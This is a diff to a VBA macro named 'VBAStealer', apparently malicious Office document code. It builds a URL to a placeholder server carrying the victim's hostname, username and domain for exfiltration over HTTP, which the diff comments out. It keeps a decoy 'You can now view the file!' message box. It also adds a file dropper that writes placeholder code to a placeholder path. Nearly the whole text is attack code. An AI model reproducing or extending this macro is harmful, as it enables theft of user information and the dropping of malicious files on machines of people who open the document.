@@ -32,9 +32,17 @@ Sub VBAStealer()
     server2 = "<SERVERIP>"
     url = server1 + server2 + "?" + "hostname=" + hostname + "&" + "username=" + username + "&" + "domain=" + domain + "&" + "profile=" + "profile"
     Dim res As String
-    res = Exer(url)
-    MsgBox("You can now view the file!")
-
 ' exfiltrate data using HTTP
+    'res = Exer(url)
+    MsgBox ("You can now view the file!")
+' Create a file dropper
+    Dim filePath As String
+    filePath = "<FILEPATH>"
+    Dim fso As FileSystemObject
+    Set fso = New FileSystemObject
+    Dim fileStream As TextStream
+    Set fileStream = fso.CreateTextFile(filePath)
+    fileStream.WriteLine "<YOUR CODE>"
+    fileStream.Close
 
 End Sub
